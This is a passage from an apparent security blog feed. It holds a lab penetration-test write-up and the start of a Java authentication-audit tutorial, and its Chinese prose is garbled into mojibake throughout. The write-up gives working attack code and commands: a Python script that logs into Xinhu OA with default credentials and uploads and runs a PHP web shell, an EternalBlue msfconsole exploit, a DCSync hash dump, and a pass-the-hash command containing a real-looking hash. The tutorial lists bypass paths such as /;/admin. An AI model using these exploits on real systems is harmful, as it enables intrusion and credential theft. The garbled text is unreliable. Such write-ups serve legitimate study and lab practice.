class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line">url_pre = &#x27;http://172.22.1.18/&#x27;</span><br><span class="line">url1 = url_pre + &#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span><br><span class="line">url2 = url_pre + &#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span><br><span class="line">url3 = url_pre + &#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;</span><br><span class="line"></span><br><span class="line">data1 = &#123;</span><br><span class="line">    &#x27;rempass&#x27;: &#x27;0&#x27;,</span><br><span class="line">    &#x27;jmpass&#x27;: &#x27;false&#x27;,</span><br><span class="line">    &#x27;device&#x27;: &#x27;1625884034525&#x27;,</span><br><span class="line">    &#x27;ltype&#x27;: &#x27;0&#x27;,</span><br><span class="line">    &#x27;adminuser&#x27;: &#x27;YWRtaW4=&#x27;,</span><br><span class="line">    &#x27;adminpass&#x27;: &#x27;YWRtaW4xMjM=&#x27;,</span><br><span class="line">    &#x27;yanzm&#x27;: &#x27;&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = session.post(url1, data=data1)</span><br><span class="line">r = session.post(url2, files=&#123;&#x27;file&#x27;: open(&#x27;1.php&#x27;, &#x27;r+&#x27;)&#125;)</span><br><span class="line"></span><br><span class="line">filepath = str(r.json()[&#x27;filepath&#x27;])</span><br><span class="line">filepath = &quot;/&quot; + filepath.split(&#x27;.uptemp&#x27;)[0] + &#x27;.php&#x27;</span><br><span class="line">id = r.json()[&#x27;id&#x27;]</span><br><span class="line">print(id)</span><br><span class="line">print(filepath)</span><br><span class="line">url3 = url_pre + f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=&#123;id&#125;&#x27;</span><br><span class="line"></span><br><span class="line">r = session.get(url3)</span><br><span class="line">r = session.get(url_pre + filepath + &quot;?1=system(&#x27;dir&#x27;);&quot;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>ç„¶åè¿è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 poc.py </span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741235759771-7fc947e0-fe10-42b6-8d06-5153b5b3dc15.png"></p><p>æ‰“å°å‡ºæ¥çš„å°±é©¬</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741235856262-1a3ad930-13d1-48b8-a5fc-d8d95001f68a.png"></p><p>ä¸Šèšå‰‘ï¼Œè®°å¾—é…ç½®ä»£ç†</p><p>ç®¡ç†å‘˜ç›®å½•ä¸‹æ‰¾åˆ°flag</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741235938760-398edb79-bab7-40b2-b777-f56cf7e2590d.png"></p><h2 id="æ°¸æ’ä¹‹è“"><a href="#æ°¸æ’ä¹‹è“" class="headerlink" title="æ°¸æ’ä¹‹è“"></a>æ°¸æ’ä¹‹è“</h2><p>è¿™è¾¹fscané«˜ç‰ˆæœ¬æœ‰ç‚¹é—®é¢˜ï¼Œæ¢ä¸ªä½ç‰ˆæœ¬çš„</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741236094331-cf88ea53-321d-47f0-b7b4-753aeb974e67.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">172.22.1.2   DCåŸŸæ§</span><br><span class="line">172.22.1.21  MS17-010æ°¸æ’ä¹‹è“</span><br><span class="line">172.22.1.18  ä¿¡å‘¼OAç³»ç»Ÿ</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°ms17-010</p><p>kaliä¸Šmsf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 msfconsole</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp_uuid</span><br><span class="line">set RHOSTS 172.22.1.21</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><h2 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h2><p>ç›´æ¥å°è¯•è®¿é—®æœ¬åœ°ç”¨æˆ·ç›®å½•æ²¡æœ‰æ‰¾åˆ°flagï¼Œè¿™è¾¹çŒœæµ‹éœ€è¦åŸŸç”¨æˆ·è®¿é—®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">kiwi_cmd &quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot; exit</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741236798106-eb97002a-7eb3-4451-9964-0f851bdd337c.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">æ‹¿åˆ°æƒé™åå¯ä»¥ç”¨creds_allç­‰å‘½ä»¤æ”¶é›†å†…ç½‘å‡­æ®ï¼Œè€Œæˆ‘ä»¬æ§åˆ¶çš„è¿™å°æœºå™¨æ˜¯æœ‰DCSyncçš„æƒé™çš„(å› ä¸ºè¿™ä¸ªæ˜¯DC1ï¼Œä¹Ÿå°±æ˜¯åŸŸæ§åˆ¶å™¨), æ‰€ä»¥èƒ½ç›´æ¥ä»åŸŸæ§ä¸Šå¯¼å‡ºHash</span><br><span class="line"></span><br><span class="line">DCSyncæ”»å‡»:</span><br><span class="line">DCSyncçš„åŸç†æ˜¯åˆ©ç”¨åŸŸæ§åˆ¶å™¨ä¹‹é—´çš„æ•°æ®åŒæ­¥å¤åˆ¶</span><br><span class="line">DCSyncæ˜¯ADåŸŸæ¸—é€ä¸­å¸¸ç”¨çš„å‡­æ®çªƒå–æ‰‹æ®µï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼ŒåŸŸå†…ä¸åŒDCæ¯éš”15åˆ†é’Ÿä¼šè¿›è¡Œä¸€æ¬¡æ•°æ®åŒæ­¥ï¼Œå½“ä¸€ä¸ªDCä»å¦å¤–ä¸€ä¸ªDCåŒæ­¥æ•°æ®æ—¶ï¼Œå‘èµ·è¯·æ±‚çš„ä¸€æ–¹ä¼šé€šè¿‡ç›®å½•å¤åˆ¶åè®®ï¼ˆMS- DRSRï¼‰æ¥å¯¹å¦å¤–ä¸€å°åŸŸæ§ä¸­çš„åŸŸç”¨æˆ·å¯†ç è¿›è¡Œå¤åˆ¶ï¼ŒDCSyncå°±æ˜¯åˆ©ç”¨è¿™ä¸ªåŸç†ï¼Œâ€œæ¨¡æ‹Ÿâ€DCå‘çœŸå®DCå‘é€æ•°æ®åŒæ­¥è¯·æ±‚ï¼Œè·å–ç”¨æˆ·å‡­æ®æ•°æ®ï¼Œç”±äºè¿™ç§æ”»å‡»åˆ©ç”¨äº†Windows RPCåè®®ï¼Œå¹¶ä¸éœ€è¦ç™»é™†åŸŸæ§æˆ–è€…åœ¨åŸŸæ§ä¸Šè½åœ°æ–‡ä»¶ï¼Œé¿å…è§¦å‘EDRå‘Šè­¦ï¼Œå› æ­¤DCSyncæ—¶ä¸€ç§éå¸¸éšè”½çš„å‡­æ®çªƒå–æ–¹å¼</span><br><span class="line"></span><br><span class="line">DCSync æ”»å‡»å‰æ:</span><br><span class="line"></span><br><span class="line">æƒ³è¿›è¡ŒDCSync æ”»å‡»ï¼Œå¿…é¡»è·å¾—ä»¥ä¸‹ä»»ä¸€ç”¨æˆ·çš„æƒé™ï¼š</span><br><span class="line">Administrators ç»„å†…çš„ç”¨æˆ·</span><br><span class="line">Domain Admins ç»„å†…çš„ç”¨æˆ·</span><br><span class="line">Enterprise Admins ç»„å†…çš„ç”¨æˆ·åŸŸæ§åˆ¶å™¨çš„è®¡ç®—æœºå¸æˆ·</span><br><span class="line">å³ï¼šé»˜è®¤æƒ…å†µä¸‹åŸŸç®¡ç†å‘˜ç»„å…·æœ‰è¯¥æƒé™</span><br><span class="line"></span><br><span class="line">è¿™é‡Œæˆ‘ä»¬ç”¨æ°¸æ’ä¹‹è“æ‰“å®Œæœ¬æ¥å°±æ˜¯systemæƒé™ï¼Œç„¶åæˆ‘ä»¬load kiwiï¼ŒæŠ“å–ç”¨æˆ·çš„hash</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬æŠ“åˆ°äº†Administratorçš„hashï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ç”¨crackmapexecæ‰“hashä¼ é€’äº†ï¼ŒAdministratoræ˜¯åŸŸæ§çš„æœºå™¨è´¦æˆ·ï¼Œå°±ç›¸å½“äºåŸŸç”¨æˆ·ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains crackmapexec smb 172.22.1.2 -u administrator -H 10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x &quot;type Users\Administrator\flag\flag03.txt&quot;</span><br></pre></td></tr></table></figure><p>æ‰“pth</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741237136731-4cbdf52c-963f-43c8-8ebf-8b8e5cab06ab.png"></p><p>å‚è€ƒ<a href="https://fushuling.com/index.php/2023/08/27/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83%c2%b7initial/">https://fushuling.com/index.php/2023/08/27/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83%c2%b7initial/</a></p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ”»é˜² </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŸŸ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaä»£ç å®¡è®¡-é‰´æƒ</title>
      <link href="/2024/11/28/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E9%89%B4%E6%9D%83/"/>
      <url>/2024/11/28/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E9%89%B4%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="é‰´æƒ-JWT-Shiro"><a href="#é‰´æƒ-JWT-Shiro" class="headerlink" title="é‰´æƒ&amp;JWT&amp;Shiro"></a>é‰´æƒ&amp;JWT&amp;Shiro</h1><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719146663073-ba6c66ec-d673-47f5-8a89-f763dd7bf6e4.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719146674233-c7d71c45-1ee9-4f75-95d9-e65d91f89875.png"></p><h2 id="èº«ä»½éªŒè¯-æœªæˆæƒè®¿é—®-é‰´æƒæŠ€æœ¯"><a href="#èº«ä»½éªŒè¯-æœªæˆæƒè®¿é—®-é‰´æƒæŠ€æœ¯" class="headerlink" title="èº«ä»½éªŒè¯-æœªæˆæƒè®¿é—®&amp;é‰´æƒæŠ€æœ¯"></a>èº«ä»½éªŒè¯-æœªæˆæƒè®¿é—®&amp;é‰´æƒæŠ€æœ¯</h2><p>1ã€æœç´¢ç±»åˆ«ï¼šä¸šåŠ¡å…³é”®å­—&amp;ç›¸å…³æ“ä½œç±»&amp;å°è£…å…³é”®å­—</p><p>2ã€åŠŸèƒ½ç‚¹ä¹Ÿé€‚ç”¨ï¼Œç›´æ¥æ‰¾é‰´æƒæŠ€æœ¯ç‰¹å¾ç›®å½•è¿›è¡Œä»£ç è¿½æº¯</p><p>-æ‰¾æœ‰æ²¡æœ‰Interceptorï¼Œæ‹¦æˆªå™¨é‡Œæœ‰æ²¡æœ‰é‰´æƒ</p><p>-æ‰¾æœ‰æ²¡æœ‰Filterï¼Œè¿‡æ»¤å™¨é‡Œæœ‰æ²¡æœ‰é‰´æƒ</p><p>-æ‰¾æœ‰æ²¡æœ‰Shiroï¼Œçœ‹ç‰ˆæœ¬åŠé‡Œé¢çš„é€»è¾‘é…ç½®</p><p>-æ‰¾æœ‰æ²¡æœ‰Jwtï¼Œçœ‹åé¢å†™çš„å››ä¸ªæ–¹å‘ç¡®å®š</p><p>-æ‰¾ä»¥ä¸Šéƒ½æ²¡æœ‰ï¼Œçœ‹çœ‹æ˜¯ä¸æ˜¯è‡ªå†™ä»£ç é€»è¾‘é‰´æƒ</p><p>èµ„æ–™è¡¥å……ï¼š</p><p>Interceptoræ˜¯ä¸€ç§æ‹¦æˆªå™¨ï¼Œä¹Ÿç§°ä¹‹ä¸ºæ‹¦æˆªå™¨é“¾ï¼ˆInterceptorChainï¼‰ï¼Œä¸»è¦ç”¨äºæ‹¦æˆªè¯·æ±‚ã€å“åº”æˆ–å¤„ç†è¿‡ç¨‹ä¸­çš„æŸäº›äº‹ä»¶ï¼Œæ¯”å¦‚æƒé™è®¤è¯ã€æ—¥å¿—è®°å½•ã€æ€§èƒ½æµ‹è¯•ç­‰ã€‚åœ¨ Java ä¸­ï¼ŒInterceptorå¯ä»¥ç”¨æ¥æ‰©å±•æ¡†æ¶ï¼Œå¢åŠ æˆ–ä¿®æ”¹æŸä¸ªæ–¹æ³•çš„è¡Œä¸ºï¼Œæˆ–è€…å¯¹åº”ç”¨æµç¨‹åšäº›å‰ç½®å¤„ç†ã€åç½®å¤„ç†ã€ç¯ç»•å¤„ç†ç­‰ã€‚</p><p>Filterè¢«ç§°ä¸ºè¿‡æ»¤å™¨ï¼Œè¿‡æ»¤å™¨å®é™…ä¸Šå°±æ˜¯å¯¹Webèµ„æºè¿›è¡Œæ‹¦æˆªï¼Œåšä¸€äº›å¤„ç†åå†äº¤ç»™ä¸‹ä¸€ä¸ªè¿‡æ»¤å™¨æˆ–Servletå¤„ç†ï¼Œé€šå¸¸éƒ½æ˜¯ç”¨æ¥æ‹¦æˆªrequestè¿›è¡Œå¤„ç†çš„ï¼Œä¹Ÿå¯ä»¥å¯¹è¿”å›çš„ responseè¿›è¡Œæ‹¦æˆªå¤„ç†ã€‚å¼€å‘äººå‘˜åˆ©ç”¨filteræŠ€æœ¯ï¼Œå¯ä»¥å®ç°å¯¹æ‰€æœ‰Webèµ„æºçš„ç®¡ç†ï¼Œä¾‹å¦‚å®ç°æƒé™è®¿é—®æ§åˆ¶ã€è¿‡æ»¤æ•æ„Ÿè¯æ±‡ã€å‹ç¼©å“åº”ä¿¡æ¯ç­‰ä¸€äº›é«˜çº§åŠŸèƒ½ã€‚</p><p>Shiroæ˜¯ä¸€ä¸ªå¼ºå¤§ä¸”æ˜“ç”¨çš„Javaå®‰å…¨æ¡†æ¶,æ‰§è¡Œèº«ä»½éªŒè¯ã€æˆæƒã€å¯†ç å’Œä¼šè¯ç®¡ç†ã€‚ä½¿ç”¨Shiroçš„æ˜“äºç†è§£çš„API,æ‚¨å¯ä»¥å¿«é€Ÿã€è½»æ¾åœ°è·å¾—ä»»ä½•åº”ç”¨ç¨‹åº,ä»æœ€å°çš„ç§»åŠ¨åº”ç”¨ç¨‹åºåˆ°æœ€å¤§çš„ç½‘ç»œå’Œä¼ä¸šåº”ç”¨ç¨‹åºã€‚</p><p>Jwtï¼šJSON WebTokenï¼Œå°†ç”¨æˆ·ä¿¡æ¯åŠ å¯†åˆ°tokené‡Œï¼ŒæœåŠ¡å™¨ä¸ä¿å­˜ä»»ä½•ç”¨æˆ·ä¿¡æ¯ï¼Œåªä¿å­˜å¯†é’¥ä¿¡æ¯ï¼Œé€šè¿‡ä½¿ç”¨ç‰¹å®šåŠ å¯†ç®—æ³•éªŒè¯tokenï¼Œé€šè¿‡tokenéªŒè¯ç”¨æˆ·èº«ä»½ã€‚åŸºäºtokençš„èº«ä»½éªŒè¯å¯ä»¥æ›¿ä»£ä¼ ç»Ÿçš„cookie+sessionèº«ä»½éªŒè¯æ–¹æ³•ã€‚è¿™ä½¿å¾—JWTæˆä¸ºé«˜åº¦åˆ†å¸ƒå¼ç½‘ç«™çš„çƒ­é—¨é€‰æ‹©ï¼Œåœ¨è¿™äº›ç½‘ç«™ä¸­ï¼Œç”¨æˆ·éœ€è¦ä¸å¤šä¸ªåç«¯æœåŠ¡å™¨æ— ç¼äº¤äº’ã€‚</p><h2 id="ä½¿ç”¨Interceptoræ‹¦æˆªå™¨è¿›è¡Œé‰´æƒ"><a href="#ä½¿ç”¨Interceptoræ‹¦æˆªå™¨è¿›è¡Œé‰´æƒ" class="headerlink" title="ä½¿ç”¨Interceptoræ‹¦æˆªå™¨è¿›è¡Œé‰´æƒ"></a>ä½¿ç”¨Interceptoræ‹¦æˆªå™¨è¿›è¡Œé‰´æƒ</h2><h3 id="æ¡ˆä¾‹-NewbeeMall-ä½¿ç”¨æ‹¦æˆªå™¨è¿›è¡Œé‰´æƒ"><a href="#æ¡ˆä¾‹-NewbeeMall-ä½¿ç”¨æ‹¦æˆªå™¨è¿›è¡Œé‰´æƒ" class="headerlink" title="æ¡ˆä¾‹-NewbeeMall-ä½¿ç”¨æ‹¦æˆªå™¨è¿›è¡Œé‰´æƒ"></a>æ¡ˆä¾‹-NewbeeMall-ä½¿ç”¨æ‹¦æˆªå™¨è¿›è¡Œé‰´æƒ</h3><p>ä¸‹è½½ï¼š<a href="https://github.com/newbee-ltd/newbee-mall">https://github.com/newbee-ltd/newbee-mall</a></p><p>Interceptor-&gt;AdminLoginInterceptor-&gt;preHandle-&gt;uri.startsWith</p><p>å¦‚æœè·¯å¾„çš„å¼€å¤´æ˜¯ä»¥&#x2F;adminå¼€å¤´å¹¶ä¸”Sessionä¸­çš„loginUserå±æ€§ä¸º null</p><p>åˆ©ç”¨ï¼šæ„é€ ç»“æ„è·¯å¾„ä¸º&#x2F;;&#x2F;adminæˆ–&#x2F;&#x2F;adminåè®¿é—®ï¼ˆä¸å½±å“è§£æï¼‰</p><p>æºç ä¸­æœshiroå’Œjwtå¼•ç”¨ï¼Œå‘ç°æ²¡æœ‰ï¼Œçœ‹æºç </p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719150304842-7056c458-ff59-4612-8d68-e46ccabec29b.png"></p><p>å‘ç°Interceptoræ‹¦æˆªå™¨</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719150726092-c11e2fc5-ba10-469e-92f7-71730d0bb1d1.png"> </p><p>å¦‚æœè·¯å¾„çš„å¼€å¤´æ˜¯ä»¥&#x2F;adminå¼€å¤´å¹¶ä¸”Sessionä¸­çš„loginUserå±æ€§ä¸º null</p><p>çœ‹åˆ°åå°æ‰€æœ‰é¡µé¢éƒ½åœ¨&#x2F;adminç›®å½•ä¸‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719151047291-20a66b81-5ce2-4e5b-8d1d-51d7bbdf935a.png"></p><p>åˆ©ç”¨ï¼šæ„é€ ç»“æ„è·¯å¾„ä¸º&#x2F;;&#x2F;adminæˆ–&#x2F;&#x2F;adminåè®¿é—®ï¼ˆä¸å½±å“è§£æï¼‰</p><p>ä¸ºäº†ç»•è¿‡å‰é¢çš„åˆ¤æ–­</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719151377936-9ba9c86f-81f4-4373-b429-f1a501eab2e4.png"></p><h2 id="ä½¿ç”¨Filterè¿‡æ»¤å™¨è¿›è¡Œé‰´æƒ"><a href="#ä½¿ç”¨Filterè¿‡æ»¤å™¨è¿›è¡Œé‰´æƒ" class="headerlink" title="ä½¿ç”¨Filterè¿‡æ»¤å™¨è¿›è¡Œé‰´æƒ"></a>ä½¿ç”¨Filterè¿‡æ»¤å™¨è¿›è¡Œé‰´æƒ</h2><h3 id="æ¡ˆä¾‹-åå¤ERP-ä½¿ç”¨è¿‡æ»¤å™¨è¿›è¡Œé‰´æƒ"><a href="#æ¡ˆä¾‹-åå¤ERP-ä½¿ç”¨è¿‡æ»¤å™¨è¿›è¡Œé‰´æƒ" class="headerlink" title="æ¡ˆä¾‹-åå¤ERP-ä½¿ç”¨è¿‡æ»¤å™¨è¿›è¡Œé‰´æƒ"></a>æ¡ˆä¾‹-åå¤ERP-ä½¿ç”¨è¿‡æ»¤å™¨è¿›è¡Œé‰´æƒ</h3><p>ä¸‹è½½ï¼š<a href="https://github.com/jishenghua/jshERP">https://github.com/jishenghua/jshERP</a></p><p>urlPatterns-&gt;LogCostFilter-&gt;doFilter-&gt;requestUrl,ignoredList,allowUrls</p><p>&#x2F;login.html&#x2F;..&#x2F;account&#x2F;getAccount</p><p>&#x2F;xiaodi.css&#x2F;..&#x2F;account&#x2F;getAccount</p><p>&#x2F;user&#x2F;login&#x2F;..&#x2F;..&#x2F;account&#x2F;getAccount</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719153222881-d43b03e7-51f5-4c14-9bc4-fb9973578502.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719153310030-24bb6725-c60c-4dae-aa37-bfc5cdfbccef.png"></p><p>&#x2F;*çš„æ„æ€æ˜¯è®¿é—®ä»»ä½•&#x2F;ä¸‹é¢çš„è·¯å¾„éƒ½ä¼šè§¦å‘è¿‡æ»¤æ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719154184224-cec6c41d-ab3b-4823-8dd9-f4e5a268bea7.png"></p><p>&#x2F;login.html&#x2F;..&#x2F;account&#x2F;getAccount</p><p>&#x2F;xiaodi.css&#x2F;..&#x2F;account&#x2F;getAccount</p><p>&#x2F;user&#x2F;login&#x2F;..&#x2F;..&#x2F;account&#x2F;getAccount</p><h2 id="ä½¿ç”¨Shiroæ¡†æ¶è¿›è¡Œé‰´æƒ"><a href="#ä½¿ç”¨Shiroæ¡†æ¶è¿›è¡Œé‰´æƒ" class="headerlink" title="ä½¿ç”¨Shiroæ¡†æ¶è¿›è¡Œé‰´æƒ"></a>ä½¿ç”¨Shiroæ¡†æ¶è¿›è¡Œé‰´æƒ</h2><h3 id="æ¡ˆä¾‹-Tumo-Shiroæ¡†æ¶é‰´æƒ"><a href="#æ¡ˆä¾‹-Tumo-Shiroæ¡†æ¶é‰´æƒ" class="headerlink" title="æ¡ˆä¾‹-Tumo-Shiroæ¡†æ¶é‰´æƒ"></a>æ¡ˆä¾‹-Tumo-Shiroæ¡†æ¶é‰´æƒ</h3><p>ä¸‹è½½ï¼š<a href="https://github.com/TyCoding/tumo">https://github.com/TyCoding/tumo</a></p><p>1ã€å¼•ç”¨shiroåšèº«ä»½éªŒè¯</p><p>pom.xml Mavené…ç½®æ–‡ä»¶</p><p><shiro-spring-version>1.5.2</shiro-spring-version></p><p>2ã€æŸ¥çœ‹shiroé…ç½®ä¿¡æ¯</p><p>anonä¸€èˆ¬ä»£è¡¨ä¸éœ€è¦é‰´æƒçš„é…ç½®ï¼Œ**åˆ™è¡¨ç¤ºè¯¥æ¥å£ä¸‹çš„æ‰€æœ‰æ¥å£ã€‚</p><p>tumo.shiro.anon_url&#x3D;\</p><p>&#x2F;login,&#x2F;logout,&#x2F;register,\</p><p>&#x2F;,&#x2F;about,&#x2F;p&#x2F;<strong>,&#x2F;links,&#x2F;comment&#x2F;</strong>,&#x2F;link&#x2F;list,&#x2F;article&#x2F;list,\</p><p>&#x2F;css&#x2F;<strong>,&#x2F;js&#x2F;</strong>,&#x2F;img&#x2F;**</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719157032869-bda3c8b7-9595-4cd7-82ef-50c439e56612.png"></p><p>anonï¼šåŒ¿åè¿‡æ»¤å™¨ï¼Œ&#x2F;loginè¿™å‡ ä¸ªç›®å½•ä¸‹æ‰€æœ‰èµ„æºéƒ½èƒ½è®¿é—®</p><p>&#x2F;article&#x2F;listä¸ºä¾‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719157627017-c3014fc9-d3cc-4f93-9024-d039a8382470.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719158227095-0a3efdb0-3d3a-4646-a871-936c588445e8.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719158182140-a64bfbb4-631e-4a64-ab76-0781babdd73c.png"></p><p>3ã€å¯»æ‰¾åˆ©ç”¨ç‚¹</p><p>CommentController.java</p><p>@RequestMapping(â€œ&#x2F;commentâ€)</p><p>@GetMapping(â€œ&#x2F;{id}â€)</p><p>@DeleteMapping(â€œ&#x2F;{id}â€)</p><p>4ã€æµ‹è¯•</p><p>GET &#x2F;comment&#x2F;1</p><p>DELETE &#x2F;comment&#x2F;1</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719158575722-709b27d5-d8e2-46e4-858f-7300fd10b90e.png"></p><p>æ³¨æ„ï¼šé™¤æ­¤ä¹‹å¤–è¿˜å¯ä»¥çœ‹ä¸‹è¿™ä¸ªç‰ˆæœ¬æ¼æ´æ˜¯å¦å¯ä»¥ç»•è¿‡</p><h2 id="ä½¿ç”¨JwtæŠ€æœ¯è¿›è¡Œé‰´æƒ"><a href="#ä½¿ç”¨JwtæŠ€æœ¯è¿›è¡Œé‰´æƒ" class="headerlink" title="ä½¿ç”¨JwtæŠ€æœ¯è¿›è¡Œé‰´æƒ"></a>ä½¿ç”¨JwtæŠ€æœ¯è¿›è¡Œé‰´æƒ</h2><p>JWTå®¡è®¡çœ‹ä»¥ä¸‹ï¼š</p><p>1ã€ç”Ÿæˆæ—¶ä½¿ç”¨ç©ºåŠ å¯†ï¼ˆé€»è¾‘ä»£ç é—®é¢˜ï¼‰</p><p>2ã€æœåŠ¡ç«¯æœªæ ¡éªŒç­¾åï¼ˆé€»è¾‘ä»£ç é—®é¢˜ï¼‰</p><p>3ã€å¯†é’¥é»˜è®¤æœªè¢«ä¿®æ”¹ï¼ˆæ­å»ºåæœªä¿®æ”¹ï¼‰</p><p>4ã€å¯†é’¥çˆ†ç ´å¯èƒ½æ€§å¤§ï¼ˆå¯†é’¥è¿‡äºç®€å•ï¼‰</p><h3 id="æ¡ˆä¾‹1-FastCMS-å¯†é’¥é»˜è®¤æœªè¢«ä¿®æ”¹"><a href="#æ¡ˆä¾‹1-FastCMS-å¯†é’¥é»˜è®¤æœªè¢«ä¿®æ”¹" class="headerlink" title="æ¡ˆä¾‹1-FastCMS-å¯†é’¥é»˜è®¤æœªè¢«ä¿®æ”¹"></a>æ¡ˆä¾‹1-FastCMS-å¯†é’¥é»˜è®¤æœªè¢«ä¿®æ”¹</h3><p>ä¸‹è½½ï¼š<a href="https://gitee.com/xjd2020/fastcms">https://gitee.com/xjd2020/fastcms</a></p><p>-çœ‹æ•°æ®åŒ…è·å–JwtæŠ€æœ¯</p><p>-ä»£ç é€»è¾‘æˆ–å¼•ç”¨JwtåŒ…</p><p>createToken-&gt;AuthConfigs-&gt;secretKey-&gt;application.yml</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719235292166-db1b7a48-5da4-48c5-a3e8-3697f6d3625e.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719232798973-e668759d-30d9-4c09-b660-23ca25b7faed.png"></p><p>æŠ“åŒ…ï¼Œè®°å¾—è¿”å›å“åº”åŒ…</p><p>jwt</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719234982733-219fb23a-34c5-4462-ae7c-b02cb779a4d7.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719234932566-c93a9c08-114b-42d4-b48d-0d21d92cb610.png"></p><p>expæ˜¯æ—¶é—´æˆ³ï¼Œæ˜¯è®¤è¯åˆ°æœŸæ—¶é—´</p><h3 id="æ¡ˆä¾‹2-Nacos-å¯†é’¥é»˜è®¤æœªè¢«ä¿®æ”¹"><a href="#æ¡ˆä¾‹2-Nacos-å¯†é’¥é»˜è®¤æœªè¢«ä¿®æ”¹" class="headerlink" 